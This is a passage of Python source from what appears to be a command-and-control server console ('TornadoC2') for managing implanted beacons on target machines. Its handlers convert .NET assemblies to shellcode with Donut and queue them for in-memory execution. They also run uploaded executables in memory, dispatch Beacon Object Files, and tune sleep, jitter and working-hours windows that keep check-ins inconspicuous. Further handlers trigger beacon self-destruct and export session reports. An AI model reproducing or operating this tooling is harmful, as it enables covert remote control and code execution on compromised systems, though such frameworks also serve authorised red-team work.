                    if not block:
                        break
                    h.update(block)
        except OSError:
            return None
        return h.hexdigest()

    def _cmd_execute_assembly(self, session, parts) -> None:
        """Execute a .NET assembly in memory on the target.

            execute-assembly <local.exe> [-- args...]

        The server runs Donut on the local assembly to produce
        position-independent shellcode that hosts the CLR, loads
        the assembly bytes, and invokes its entry point. The
        shellcode is then queued as a task and executed in-process
        on the target.

        Requires the Donut binary on PATH on the *server* machine.
        The target needs no .NET runtime installed beyond what
        Windows already provides (the CLR is present on every
        Windows since 7).
        """
        import base64 as _b64
        import os as _os
        import shutil
        import subprocess
        import tempfile

        c = self.c

        if session.identity.get('os') != 'windows':
            print(f"{c['red']}execute-assembly is Windows-only. "
                  f"This session is "
                  f"{session.identity.get('os','?')}{c['end']}")
            return
        if len(parts) < 2:
            print(f"{c['red']}Usage: execute-assembly <local.exe> "
                  f"[-- args...]{c['end']}")
            return

        local_path = parts[1]
        rest = parts[2:]
        if rest and rest[0] == '--':
            rest = rest[1:]

        if not _os.path.isfile(local_path):
            print(f"{c['red']}Local assembly not found: "
                  f"{local_path}{c['end']}")
            return
        if _os.path.getsize(local_path) > 32 * 1024 * 1024:
            print(f"{c['red']}Assembly too large (max 32 MiB)"
                  f"{c['end']}")
            return

        donut = shutil.which('donut')
        if donut is None:
            vendored = _os.path.join(
                _os.path.dirname(_os.path.abspath(__file__)),
                '..', '..', 'beacon', 'bin', 'donut')
            vendored = _os.path.normpath(vendored)
            if _os.name == 'nt':
                vendored_exe = vendored + '.exe'
                if _os.path.isfile(vendored_exe):
                    vendored = vendored_exe
            if _os.path.isfile(vendored):
                donut = vendored
        if donut is None:
            print(f"{c['red']}Donut not found on PATH. Install from "
                  f"https://github.com/TheWover/donut/releases or "
                  f"place a binary at beacon/bin/donut.{c['end']}")
            return

        arch = session.identity.get('arch', 'amd64')
        arch_flag = {'amd64': '2', '386': '1'}.get(arch)
        if arch_flag is None:
            print(f"{c['red']}execute-assembly does not support "
                  f"architecture {arch}{c['end']}")
            return

        with tempfile.TemporaryDirectory(prefix='tc_donut_') as td:
            shellcode_path = _os.path.join(td, 'shellcode.bin')
            cmd = [
                donut,
                '-i', local_path,
                '-o', shellcode_path,
                '-a', arch_flag,
                '-f', '1',
                '-t', '2',
                '-x', '2',
            ]
            if rest:
                cmd.extend(['-p', ' '.join(rest)])

            print(f"{c['cyan']}[*] Running Donut on "
                  f"{_os.path.basename(local_path)}...{c['end']}")
            try:
                proc = subprocess.run(
                    cmd, capture_output=True, text=True,
                    check=False, timeout=60)
            except subprocess.TimeoutExpired:
                print(f"{c['red']}Donut timed out after 60s"
                      f"{c['end']}")
                return
            if proc.returncode != 0:
                print(f"{c['red']}Donut failed "
                      f"(exit {proc.returncode}):{c['end']}")
                print((proc.stderr or proc.stdout or '').strip())
                return
            if not _os.path.isfile(shellcode_path):
                print(f"{c['red']}Donut produced no output"
                      f"{c['end']}")
                return
            with open(shellcode_path, 'rb') as fh:
                shellcode = fh.read()

        if not shellcode:
            print(f"{c['red']}Donut produced empty shellcode"
                  f"{c['end']}")
            return
        if len(shellcode) > 32 * 1024 * 1024:
            print(f"{c['red']}Shellcode too large for the task queue "
                  f"({len(shellcode)} bytes){c['end']}")
            return

        b64 = _b64.b64encode(shellcode).decode('ascii')
        print(f"{c['cyan']}[*] Dispatching assembly "
              f"({len(shellcode)} bytes of shellcode, "
              f"{len(b64)} on the wire){c['end']}")

        self._dispatch(
            session,
            ['execute_assembly', b64, '60'],
            task_timeout=300, wait_timeout=320)

    def _cmd_execmem(self, session, remote_path, kind, extra_args) -> None:
        """Execute a file that was previously uploaded, in memory."""
        kind = kind.lower()
        if kind not in ('exe', 'elf'):
            print(f"{self.c['red']}Unsupported payload type: {kind} "
                  f"(expected exe or elf){self.c['end']}")
            return

        if kind == 'exe' and session.identity.get('os') != 'windows':
            print(f"{self.c['red']}exe execution requires a Windows "
                  f"target{self.c['end']}")
            return
        if kind == 'elf' and session.identity.get('os') == 'windows':
            print(f"{self.c['red']}elf execution requires a Unix "
                  f"target{self.c['end']}")
            return

        args = [remote_path, kind]
        if extra_args and extra_args[0] == '--':
            extra_args = extra_args[1:]
        args.extend(extra_args)

        print(f"{self.c['cyan']}[*] Executing {remote_path} ({kind}) "
              f"in memory...{self.c['end']}")
        self._dispatch(session, ['execmem'] + args,
                       task_timeout=600, wait_timeout=620)

    # ------------------------------------------------------------------
    # Beacon Object Files

    def _bof_registry_path(self):
        """Same file the shell handler's bofloader plugin maintains."""
        here = _os.path.dirname(_os.path.abspath(__file__))
        return _os.path.join(here, '..', '..', 'logs',
                             '.tornadoc2_bofs.json')

    def _load_bof_registry(self):
        import json as _json
        path = _os.path.normpath(self._bof_registry_path())
        try:
            with open(path, 'r', encoding='utf-8') as f:
                data = _json.load(f)
            return data if isinstance(data, dict) else {}
        except Exception:
            return {}

    def _cmd_bof_list(self, session) -> None:
        reg = self._load_bof_registry()
        if not reg:
            print(f"{self.c['yellow']}No BOFs registered. From the shell "
                  f"handler, run:\n"
                  f"  run bofloader import <file.cna|file.o|dir>\n"
                  f"Then return to the beacon console and use `bof <name>`."
                  f"{self.c['end']}")
            return
        print(f"{self.c['cyan']}Registered BOFs "
              f"(from {self._bof_registry_path()}):{self.c['end']}")
        for name in sorted(reg):
            entry = reg[name]
            if not isinstance(entry, dict):
                print(f"  {self.c['green']}{name:<20}{self.c['end']}  "
                      f"{self.c['red']}(malformed registry entry)"
                      f"{self.c['end']}")
                continue
            fmt = entry.get('format') or '-'
            path = entry.get('path') or ''
            if path and _os.path.isfile(path):
                shown = path
                exists = ''
            else:
                shown = path or '(no path recorded)'
                exists = f" {self.c['red']}(missing){self.c['end']}"
            print(f"  {self.c['green']}{name:<20}{self.c['end']}  "
                  f"fmt={fmt:<8}  {shown}{exists}")

    def _pack_bof_args(self, args, fmt):
        """Pack operator args according to a bof_pack format string.

        Mirrors the shell handler's _pack_args_from_format so a BOF
        invoked from the beacon console produces byte-identical arg
        blobs to the same BOF invoked from the shell handler.
        """
        import struct as _struct
        if not fmt:
            if not args:
                return b''

            body = ' '.join(args).encode('utf-8') + b'\x00'
            return _struct.pack('<I', len(body)) + body

        out = bytearray()
        for i, ch in enumerate(fmt):
            val = args[i] if i < len(args) else ''
            if ch == 'z':
                body = val.encode('utf-8') + b'\x00'
                out += _struct.pack('<I', len(body)) + body
            elif ch == 'Z':
                body = val.encode('utf-16-le') + b'\x00\x00'
                out += _struct.pack('<I', len(body)) + body
            elif ch == 'i':
                out += _struct.pack('<i', int(val))
            elif ch == 's':
                out += _struct.pack('<h', int(val))
            elif ch == 'b':
                raw = _b64.b64decode(val)
                out += _struct.pack('<I', len(raw)) + raw
            else:
                raise ValueError(f"unsupported format char: {ch!r}")
        return bytes(out)

    def _cmd_bof(self, session, name_or_path, args) -> None:
        """Resolve a BOF name or path, package it, and dispatch."""
        # Windows-only.
        if session.identity.get('os') != 'windows':
            print(f"{self.c['red']}BOFs are Windows COFF objects — "
                  f"this session is {session.identity.get('os','?')}"
                  f"{self.c['end']}")
            return

        if _os.path.isfile(name_or_path):
            bof_path = name_or_path
            fmt = ''
            origin = 'path'
        else:
            reg = self._load_bof_registry()
            if name_or_path not in reg:
                print(f"{self.c['red']}Unknown BOF: {name_or_path}"
                      f"{self.c['end']}")
                print(f"{self.c['yellow']}Registered: "
                      f"{', '.join(sorted(reg)) or '(none)'}"
                      f"{self.c['end']}")
                return
            entry = reg[name_or_path]
            if not isinstance(entry, dict):
                print(f"{self.c['red']}Registry entry for "
                      f"{name_or_path!r} is malformed"
                      f"{self.c['end']}")
                return
            bof_path = entry.get('path') or ''
            fmt = entry.get('format', '') or ''
            origin = f'registered ({name_or_path})'

        if not bof_path:
            print(f"{self.c['red']}No path recorded for BOF "
                  f"{name_or_path!r}{self.c['end']}")
            return
        if not _os.path.isfile(bof_path):
            print(f"{self.c['red']}BOF file not found: {bof_path}"
                  f"{self.c['end']}")
            return

        try:
            with open(bof_path, 'rb') as f:
                coff = f.read()
        except OSError as exc:
            print(f"{self.c['red']}Read error: {exc}{self.c['end']}")
            return

        if len(coff) < 20:
            print(f"{self.c['red']}File too small to be a COFF: "
                  f"{bof_path}{self.c['end']}")
            return

        import struct as _struct
        machine = _struct.unpack_from('<H', coff, 0)[0]
        if machine not in (0x8664, 0x014c):
            print(f"{self.c['red']}Unsupported COFF machine: "
                  f"0x{machine:04X}{self.c['end']}")
            return

        try:
            packed = self._pack_bof_args(list(args), fmt)
        except Exception as exc:
            print(f"{self.c['red']}Argument error: {exc}{self.c['end']}")
            if fmt:
                print(f"{self.c['yellow']}Format for this BOF: "
                      f"{fmt!r} (needs {len(fmt)} args){self.c['end']}")
            return

        coff_b64 = _b64.b64encode(coff).decode('ascii')
        args_b64 = _b64.b64encode(packed).decode('ascii')

        print(f"{self.c['cyan']}[*] Dispatching BOF "
              f"({len(coff)} bytes, {origin}, "
              f"{len(packed)} arg bytes)...{self.c['end']}")

        self._dispatch(session, ['bof', coff_b64, '', args_b64],
                       task_timeout=300, wait_timeout=320)

    # ------------------------------------------------------------------
    # Meta commands

    def _cmd_sleep(self, session, parts) -> None:
        if len(parts) < 2:
            print(f"{self.c['red']}Usage: sleep <seconds> [jitter]"
                  f"{self.c['end']}")
            return
        try:
            interval = int(parts[1])
            jitter = float(parts[2]) if len(parts) > 2 else session.jitter
        except ValueError:
            print(f"{self.c['red']}Invalid values{self.c['end']}")
            return
        if not (constants.MIN_SLEEP <= interval <= constants.MAX_SLEEP):
            print(f"{self.c['red']}Sleep must be "
                  f"{constants.MIN_SLEEP}-{constants.MAX_SLEEP} "
                  f"(0 = poll continuously)"
                  f"{self.c['end']}")
            return

        session.sleep_interval = interval
        session.jitter = max(0.0, min(jitter, 1.0))
        print(f"{self.c['green']}Updated: {interval}s "
              f"(jitter {session.jitter:.2f}) — takes effect next check-in"
              f"{self.c['end']}")

    @staticmethod
    def _parse_clock(s: str):
        """Parse "HH:MM" into minutes since midnight. Returns
        (value, True) on success, (0, False) on any parse error."""
        s = s.strip()
        if ':' not in s:
            return 0, False
        try:
            h_str, m_str = s.split(':', 1)
            h = int(h_str)
            m = int(m_str)
        except (ValueError, TypeError):
            return 0, False
        if not (0 <= h <= 23 and 0 <= m <= 59):
            return 0, False
        return h * 60 + m, True

    @staticmethod
    def _format_clock(minutes: int) -> str:
        return f"{minutes // 60:02d}:{minutes % 60:02d}"

    def _show_window_state(self, session) -> None:
        """Print the current window and an ETA for the next poll."""
        if session.work_hours_start == session.work_hours_end:
            print(f"{self.c['cyan']}Work hours: "
                  f"{self.c['yellow']}off{self.c['end']} "
                  f"(beacon polls 24/7){self.c['end']}")
        else:
            s = self._format_clock(session.work_hours_start)
            e = self._format_clock(session.work_hours_end)
            shape = ("wrapped"
                     if session.work_hours_start > session.work_hours_end
                     else "day")
            print(f"{self.c['cyan']}Work hours: "
                  f"{self.c['green']}{s}-{e}{self.c['end']} "
                  f"({shape} window, target local time){self.c['end']}")

        if not session.alive:
            print(f"  {self.c['yellow']}Beacon has not checked in "
                  f"recently — the window applies when it "
                  f"reconnects.{self.c['end']}")
            return

        sleep_s = max(session.sleep_interval, 0)
        if session.work_hours_start == session.work_hours_end:
            eta = sleep_s if sleep_s > 0 else 1
        else:
            now = time.localtime()
            cur = now.tm_hour * 60 + now.tm_min
            if session.work_hours_start < session.work_hours_end:
                inside = (session.work_hours_start <= cur
                          < session.work_hours_end)
            else:
                inside = (cur >= session.work_hours_start
                          or cur < session.work_hours_end)
            eta = sleep_s if (inside and sleep_s > 0) else 60
        print(f"  {self.c['yellow']}Next poll within {eta}s"
              f"{self.c['end']}")

    def _cmd_workhours(self, session, parts) -> None:
        """Show, set, or disable the beacon's working-hours window.

        Usage:
            workhours                     show current window
            workhours <start> <end>       set window, "HH:MM" each
            workhours off                 disable the gate

        The window is applied on the target's local time. Both the
        server and the agent hold a copy; the server is authoritative
        and pushes the current values on every /tasks poll, so a
        change here reaches the agent within one poll cycle.
        """
        if len(parts) < 2 or parts[1].lower() in ('show', 'status', '?'):
            self._show_window_state(session)
            return

        arg1 = parts[1].lower()

        if arg1 in ('off', 'disable', 'none', '0:0', '00:00-00:00'):
            if session.work_hours_start == session.work_hours_end:
                print(f"{self.c['yellow']}Work hours already off"
                      f"{self.c['end']}")
                return
            session.work_hours_start = 0
            session.work_hours_end = 0
            print(f"{self.c['green']}Work hours disabled{self.c['end']}")
            self._show_window_state(session)
            return

        if len(parts) < 3:
            print(f"{self.c['red']}Usage: workhours <start> <end> | "
                  f"workhours off | workhours{self.c['end']}")
            return

        start, ok1 = self._parse_clock(parts[1])
        end, ok2 = self._parse_clock(parts[2])
        if not ok1 or not ok2:
            print(f"{self.c['red']}Invalid time — expected HH:MM for "
                  f"both arguments{self.c['end']}")
            return
        if start == end:
            print(f"{self.c['yellow']}Start equals end — that disables "
                  f"the gate. Use 'workhours off' if that is what you "
                  f"meant.{self.c['end']}")
            return

        if session.work_hours_start == session.work_hours_end:
            old_label = "off"
        else:
            old_label = (f"{self._format_clock(session.work_hours_start)}-"
                         f"{self._format_clock(session.work_hours_end)}")

        session.work_hours_start = start
        session.work_hours_end = end

        new_label = (f"{self._format_clock(start)}-"
                     f"{self._format_clock(end)}")
        shape = "wrapped" if start > end else "day"
        print(f"{self.c['green']}Work hours: {old_label} -> "
              f"{new_label} ({shape} window){self.c['end']}")
        self._show_window_state(session)

    def _cmd_kill(self, session) -> None:
        answer = ""
        try:
            answer = input(
                f"{self.c['yellow']}Self-destruct beacon #{session.id} "
                f"({session.display_name})? This cannot be undone. "
                f"[y/N]: {self.c['end']}"
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if answer not in ('y', 'yes'):
            print(f"{self.c['cyan']}Cancelled{self.c['end']}")
            return
        task_id = self.engine.enqueue(session.id, 'exit', [], timeout=5,
                                      track=False)
        if task_id is None:
            print(f"{self.c['red']}Failed to enqueue — queue full"
                  f"{self.c['end']}")
            return
        print(f"{self.c['yellow']}Self-destruct queued for beacon "
              f"#{session.id} — waiting for acknowledgement "
              f"(up to 15s){self.c['end']}")
        result = session.await_result(task_id, timeout=15.0)
        if result is None:
            with session._pending_lock:
                for r in reversed(session.results):
                    if r.id == task_id:
                        result = r
                        break
        if result is None:
            print(f"{self.c['red']}Beacon did not acknowledge within 15s. "
                  f"It may be offline or the task queue was congested. "
                  f"The session is dead as of now.{self.c['end']}")
        else:
            print(f"{self.c['green']}Beacon acknowledged self-destruct."
                  f"{self.c['end']}")

        try:
            ans = input(
                f"{self.c['yellow']}Remove beacon #{session.id} from "
                f"the session list? [Y/n]: {self.c['end']}"
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if ans in ('', 'y', 'yes'):
            try:
                self.engine.forget(session.id)
                print(f"{self.c['cyan']}Beacon #{session.id} forgotten"
                      f"{self.c['end']}")
            except Exception:
                pass

    def _cmd_forget(self, session) -> bool:
        """Remove a beacon session from the registry entirely.

        Returns True if the session was actually forgotten, False if
        the operator cancelled or an error occurred. The caller uses
        the return value to decide whether to detach from the console.
        """
        answer = ""
        try:
            answer = input(
                f"{self.c['yellow']}Forget beacon #{session.id} "
                f"({session.display_name})? Its task history and "
                f"fingerprint are lost. [y/N]: {self.c['end']}"
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return False
        if answer not in ('y', 'yes'):
            print(f"{self.c['cyan']}Cancelled{self.c['end']}")
            return False
        try:
            self.engine.forget(session.id)
        except Exception as exc:
            print(f"{self.c['red']}Could not forget session: {exc}"
                  f"{self.c['end']}")
            return False
        print(f"{self.c['green']}Beacon #{session.id} forgotten"
              f"{self.c['end']}")
        return True

    def _cmd_graph(self, parts=None) -> None:
        """Print the engagement-wide session graph.

            graph                tree view (default)
            graph flat           one line per beacon
            graph summary        counts only
            graph path <a> <b>   show the shortest edge path between
                                  two beacons
        """
        from .graph import Graph
        g = Graph(self.engine)
        parts = parts or []
        sub = parts[1].lower() if len(parts) > 1 else 'tree'

        if sub == 'path':
            if len(parts) < 4:
                print(f"{self.c['red']}usage: graph path <id_a> "
                      f"<id_b>{self.c['end']}")
                return
            try:
                a = int(parts[2])
                b = int(parts[3])
            except ValueError:
                print(f"{self.c['red']}ids must be integers"
                      f"{self.c['end']}")
                return
            path = g.find_path(a, b)
            if path is None:
                print(f"{self.c['yellow']}no shared-attribute path "
                      f"between #{a} and #{b}{self.c['end']}")
                return
            print()
            print(f"{self.c['cyan']}PATH #{a} → #{b}{self.c['end']}")
            for i, nid in enumerate(path):
                marker = '  ' if i == 0 else f"{self.c['dim']}→ "
                print(f"  {marker}{self.c['cyan']}#{nid}{self.c['end']}")
            print()
            return

        if sub not in ('tree', 'flat', 'summary'):
            print(f"{self.c['red']}unknown graph mode: {sub} "
                  f"(use tree, flat, summary, or path){self.c['end']}")
            return
        print()
        print(g.render_ascii(self.c, mode=sub))
        print()

    def _cmd_tasks(self, session) -> None:
        pending = session.list_pending()
        if not pending:
            print(f"{self.c['yellow']}No outstanding tasks"
                  f"{self.c['end']}")
            return
        for tid in pending:
            print(f"  {tid}")

    def _cmd_schedule(self, session, parts) -> None:
        """Server-side scheduled tasks.

            schedule add <interval> <verb> [args...]
            schedule list
            schedule remove <id>

        Interval: 30s / 5m / 2h / 1d. The schedule fires the verb
        every interval and the result is delivered as an ordinary
        async task result. Schedules persist across handler
        restarts.
        """
        c = self.c
        sched = getattr(self.engine, 'scheduler', None)
        if sched is None:
            print(f"{c['red']}scheduler unavailable{c['end']}")
            return

        sub = parts[1].lower() if len(parts) > 1 else 'list'

        if sub in ('list', 'ls'):
            entries = [s for s in sched.list()
                       if s.session_id == session.id]
            if not entries:
                print(f"{c['dim']}no schedules for this beacon"
                      f"{c['end']}")
                return
            print(f"{c['cyan']}Schedules for beacon "
                  f"#{session.id}{c['end']}")
            for s in entries:
                left = max(0, int(s.next_fire - time.time()))
                print(f"  {c['green']}{s.id}{c['end']}  "
                      f"every {s.interval}s  "
                      f"next in {left}s  "
                      f"runs={s.runs}  "
                      f"{s.verb} {' '.join(s.args)}")
            return

        if sub == 'remove' or sub == 'rm':
            if len(parts) < 3:
                print(f"{c['red']}usage: schedule remove <id>"
                      f"{c['end']}")
                return
            sid = parts[2]
            s = sched.get(sid)
            if s is None or s.session_id != session.id:
                print(f"{c['red']}unknown schedule{c['end']}")
                return
            sched.remove(sid)
            print(f"{c['green']}removed schedule {sid}{c['end']}")
            return

        if sub == 'add':
            from .scheduler import parse_interval
            if len(parts) < 4:
                print(f"{c['red']}usage: schedule add <interval> "
                      f"<verb> [args...]{c['end']}")
                return
            interval_sec = parse_interval(parts[2])
            if interval_sec is None:
                print(f"{c['red']}invalid interval "
                      f"(use 30s / 5m / 2h / 1d){c['end']}")
                return
            verb = parts[3]
            args = parts[4:]
            s = sched.add(session.id, verb, args, interval_sec)
            print(f"{c['green']}schedule {s.id} added: "
                  f"every {interval_sec}s {verb} "
                  f"{' '.join(args)}{c['end']}")
            return

        print(f"{c['red']}usage: schedule "
              f"<add|list|remove>{c['end']}")

    def _cmd_export(self, session, parts) -> None:
        """Export the beacon session to a self-contained HTML report.

        Usage:
            export                 write to exports/beacon_<id>_<name>_<ts>.html
            export <output_path>   write to a specific path

        The default destination is the same `exports/` directory the
        shell handler's `export` command uses, so shell transcripts and
        beacon reports share one artefact tree under the engagement
        workspace.

        The report is styled for both screen and print, uses no
        external assets, and can be attached to an engagement
        deliverable without post-processing.
        """
        import html as _html
        import os as _os
        import time as _time

        if len(parts) > 1:
            out_path = parts[1]
            parent = _os.path.dirname(out_path)
            if parent:
                try:
                    _os.makedirs(parent, exist_ok=True)
                except OSError:
                    pass
        else:
            stamp = _time.strftime('%Y%m%d_%H%M%S')
            safe_name = (session.display_name
                         .replace('/', '_')
                         .replace('\\', '_')
                         .replace('@', '_')
                         .replace(' ', '_'))
            filename = f"beacon_{session.id}_{safe_name}_{stamp}.html"
            try:
                _os.makedirs(constants.EXPORTS_DIR, exist_ok=True)
            except OSError:
                pass
            out_path = _os.path.join(constants.EXPORTS_DIR, filename)

        def esc(v):
            if v is None:
                return ''
            return _html.escape(str(v))

        # ---- Identity -----------------------------------------------
        ident = session.identity or {}
        if ident:
            ident_rows = ''.join(
                f"<tr><th>{esc(k)}</th><td>{esc(v)}</td></tr>"
                for k, v in sorted(ident.items())
            )
        else:
            ident_rows = "<tr><td colspan='2'>(no identity)</td></tr>"

        # ---- Scheduling and state -----------------------------------
        if session.work_hours_start == session.work_hours_end:
            wh = "Disabled (24/7)"
        else:
            def _fmt(m):
                return f"{m // 60:02d}:{m % 60:02d}"
            wh = (f"{_fmt(session.work_hours_start)} &ndash; "
                  f"{_fmt(session.work_hours_end)}")

        if session.kill_deadline:
            kill_str = _time.strftime(
                '%Y-%m-%d %H:%M:%S',
                _time.localtime(session.kill_deadline))
            remaining = session.kill_deadline - _time.time()
            if remaining > 0:
                days = int(remaining // 86400)
                kill_str += f" (self-destruct in {days}d)"
            else:
                kill_str += " (expired)"
        else:
            kill_str = "None"

        first_seen = _time.strftime(
            '%Y-%m-%d %H:%M:%S',
            _time.localtime(session.first_seen))
        last_seen = _time.strftime(
            '%Y-%m-%d %H:%M:%S',
            _time.localtime(session.last_seen))

        sched_rows = ''.join((
            f"<tr><th>Fingerprint</th>"
            f"<td class='mono'>{esc(session.fingerprint)}</td></tr>",
            f"<tr><th>First seen</th><td>{esc(first_seen)}</td></tr>",
            f"<tr><th>Last seen</th><td>{esc(last_seen)}</td></tr>",
            f"<tr><th>Check-ins</th><td>{session.checkins}</td></tr>",
            f"<tr><th>Last address</th>"
            f"<td class='mono'>{esc(session.last_addr or '?')}</td></tr>",
            f"<tr><th>Sleep interval</th>"
            f"<td>{session.sleep_interval}s "
            f"(jitter {session.jitter:.2f})</td></tr>",
            f"<tr><th>Kill deadline</th><td>{esc(kill_str)}</td></tr>",
            f"<tr><th>Working hours</th><td>{wh}</td></tr>",
            f"<tr><th>Rejected results</th>"
            f"<td>{session.rejected_results}</td></tr>",
        ))

        # ---- Summary cards ------------------------------------------
        os_name = ident.get('os', '?')
        arch = ident.get('arch', '')
        platform = f"{os_name}/{arch}" if arch else os_name
        identity_str = session.display_name

        # ---- Task history -------------------------------------------
        history_parts = []
        for idx, r in enumerate(session.results, 1):
            try:
                out_text = r.output.decode('utf-8', errors='replace')
            except Exception:
                out_text = '<non-utf8 output>'
            err = r.error or ''
            ts_attr = esc(r.id)
            block = [
                "<div class='task'>",
                "<div class='task-hdr'>",
                f"<span class='task-num'>#{idx}</span>",
                f"<span class='task-id mono'>{esc(r.id)}</span>",
                f"<span class='task-exit'>exit {r.exit_code}</span>",
                "</div>",
            ]
            if err:
                block.append(f"<pre class='err'>{esc(err)}</pre>")
            if out_text:
                if len(out_text) > 4000:
                    preview = out_text[:2000]
                    block.append(
                        "<details open>"
                        f"<summary>output ({len(out_text)} bytes)</summary>"
                        f"<pre class='out'>{esc(preview)}"
                        f"&hellip;\n[truncated in report; "
                        f"see session log for full output]</pre>"
                        "</details>"
                    )
                else:
                    block.append(f"<pre class='out'>{esc(out_text)}</pre>")
            block.append("</div>")
            history_parts.append(''.join(block))

        if history_parts:
            history = ''.join(history_parts)
        else:
            history = ("<p class='empty'>No task results recorded "
                       "for this session.</p>")

        # ---- Session log --------------------------------------------
        log_text = ''
        log_path = None
        if session.logger is not None:
            try:
                log_path = _os.path.join(
                    session.logger.session_dir, 'session.log')
                if _os.path.isfile(log_path):
                    with open(log_path, 'r', encoding='utf-8',
                              errors='replace') as fh:
                        log_text = fh.read()
            except Exception:
                log_text = ''

        if log_text:
            lines = log_text.splitlines()
            numbered = '\n'.join(
                f"{i:>5}  {line}" for i, line in enumerate(lines, 1)
            )
            log_html = esc(numbered)
        else:
            log_html = '(no session log written)'

        # ---- Assemble ----------------------------------------------
        generated = _time.strftime('%Y-%m-%d %H:%M:%S')
        result_count = len(session.results)

        page = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Beacon Report &mdash; #{session.id} {esc(identity_str)}</title>
<style>
:root {{
  --bg: #ffffff;
  --fg: #1f2328;
  --muted: #656d76;
  --border: #d0d7de;
  --accent: #0969da;
  --accent-soft: #ddf4ff;
  --green: #1a7f37;
  --red: #cf222e;
  --yellow: #9a6700;
  --code-bg: #f6f8fa;
}}
* {{ box-sizing: border-box; }}
body {{
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
               "Helvetica Neue", Arial, sans-serif;
  font-size: 15px;
  line-height: 1.55;
  color: var(--fg);
  background: var(--bg);
  margin: 0;
  padding: 0;
}}
.page {{
  max-width: 900px;
  margin: 0 auto;
  padding: 48px 32px 96px 32px;
}}
header.report {{
  border-bottom: 2px solid var(--border);
  padding-bottom: 16px;
  margin-bottom: 32px;
}}
header.report h1 {{
  margin: 0 0 4px 0;
  font-size: 26px;
  font-weight: 600;
  color: var(--fg);
}}
header.report .subtitle {{
  color: var(--muted);
  font-size: 14px;
  margin: 0;
}}
header.report .generated {{
  color: var(--muted);
  font-size: 12px;
  margin-top: 8px;
}}
.cards {{
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
  gap: 12px;
  margin: 24px 0 40px 0;
}}
.card {{
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 12px 16px;
  background: var(--code-bg);
}}
.card .label {{
  color: var(--muted);
  font-size: 12px;
  text-transform: uppercase;
  letter-spacing: 0.05em;
  margin-bottom: 4px;
}}
.card .value {{
  font-size: 16px;
  font-weight: 600;
  word-break: break-word;
}}
.card .value.mono {{
  font-family: ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
  font-size: 13px;
}}
h2 {{
  font-size: 18px;
  font-weight: 600;
  margin: 40px 0 12px 0;
  padding-bottom: 6px;
  border-bottom: 1px solid var(--border);
}}
table {{
  border-collapse: collapse;
  width: 100%;
  margin: 8px 0;
}}
th, td {{
  text-align: left;
  padding: 6px 12px 6px 0;
  vertical-align: top;
  border-bottom: 1px solid #f0f3f6;
}}
th {{
  color: var(--muted);
  font-weight: 500;
  width: 180px;
  white-space: nowrap;
}}
td {{ color: var(--fg); }}
.mono {{
  font-family: ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
  font-size: 13px;
}}
.task {{
  border: 1px solid var(--border);
  border-radius: 6px;
  margin: 12px 0;
  overflow: hidden;
}}
.task-hdr {{
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 8px 12px;
  background: var(--code-bg);
  border-bottom: 1px solid var(--border);
  font-size: 13px;
  gap: 12px;
}}
.task-num {{
  color: var(--muted);
  font-weight: 600;
  min-width: 32px;
}}
.task-id {{
  color: var(--muted);
  flex: 1;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}}
.task-exit {{
  color: var(--muted);
  font-size: 12px;
}}
.task pre {{
  margin: 0;
  padding: 12px 16px;
  background: #ffffff;
  font-family: ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
  font-size: 13px;
  line-height: 1.5;
  white-space: pre-wrap;
  word-break: break-word;
  overflow-x: auto;
}}
.task pre.out {{
  color: var(--fg);
}}
.task pre.err {{
  color: var(--red);
  background: #fff5f5;
  border-bottom: 1px solid var(--border);
}}
details summary {{
  cursor: pointer;
  padding: 6px 16px;
  background: var(--code-bg);
  border-bottom: 1px solid var(--border);
  color: var(--muted);
  font-size: 13px;
  user-select: none;
}}
details summary:hover {{
  background: var(--accent-soft);
  color: var(--accent);
}}
.log {{
  background: var(--code-bg);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 12px 16px;
  font-family: ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
  font-size: 12px;
  line-height: 1.5;
  white-space: pre-wrap;
  word-break: break-word;
  color: var(--muted);
  max-height: 400px;
  overflow-y: auto;
}}
.empty {{
  color: var(--muted);
  font-style: italic;
}}
.footer {{
  margin-top: 64px;
  padding-top: 16px;
  border-top: 1px solid var(--border);
  color: var(--muted);
  font-size: 12px;
}}
.footer p {{ margin: 4px 0; }}
code {{
  background: var(--code-bg);
  border-radius: 3px;
  padding: 1px 5px;
  font-family: ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
  font-size: 0.9em;
}}
@media print {{
  body {{ font-size: 11pt; }}
  .page {{ padding: 0; max-width: 100%; }}
  .card {{ break-inside: avoid; }}
  .task {{ break-inside: avoid; }}
  details {{ break-inside: avoid; }}
  details:not([open]) > summary::after {{
    content: " (collapsed in interactive view)";
    color: #888;
  }}
  .log {{ max-height: none; }}
  header.report {{ break-after: avoid; }}
  h2 {{ break-after: avoid; }}
}}
</style>
</head>
<body>
<div class="page">

<header class="report">
  <h1>Beacon Session Report</h1>
  <p class="subtitle">
    Beacon <strong>#{session.id}</strong> &mdash;
    {esc(identity_str)} &mdash; {esc(platform)}
  </p>
  <p class="generated">Generated {esc(generated)}</p>
</header>

<div class="cards">
  <div class="card">
    <div class="label">Platform</div>
    <div class="value">{esc(platform)}</div>
  </div>
  <div class="card">
    <div class="label">Check-ins</div>
    <div class="value">{session.checkins}</div>
  </div>
  <div class="card">
    <div class="label">Sleep</div>
    <div class="value">{session.sleep_interval}s &times; {session.jitter:.2f}</div>
  </div>
  <div class="card">
    <div class="label">Task results</div>
    <div class="value">{result_count}</div>
  </div>
  <div class="card">
    <div class="label">Last seen</div>
    <div class="value mono">{esc(last_seen)}</div>
  </div>
  <div class="card">
    <div class="label">Fingerprint</div>
    <div class="value mono">{esc(session.fingerprint[:16])}&hellip;</div>
  </div>
</div>

<h2>Identity</h2>
<table>{ident_rows}</table>

<h2>Scheduling &amp; state</h2>
<table>{sched_rows}</table>

